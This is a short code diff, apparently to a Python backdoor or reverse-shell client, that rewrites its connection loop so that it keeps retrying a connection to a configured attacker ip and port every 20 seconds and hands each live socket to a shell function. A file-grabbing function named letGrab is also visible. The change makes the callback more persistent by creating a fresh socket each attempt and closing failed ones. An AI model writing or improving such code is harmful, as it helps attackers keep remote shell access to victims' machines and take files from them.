@@ -16,14 +16,15 @@ def initiate():
     tuneConnection()
 
 def tuneConnection():
-    mySocket = socket.socket()
     # Trying to connect to server every 20 seconds
     while True:
         try:
+            mySocket = socket.socket()
             mySocket.connect((ip, port))
             shell(mySocket)
         except:
-            tuneConnection()
+            mySocket.close()
+            pass 
         time.sleep(20)
 
 def letGrab(mySocket, path):
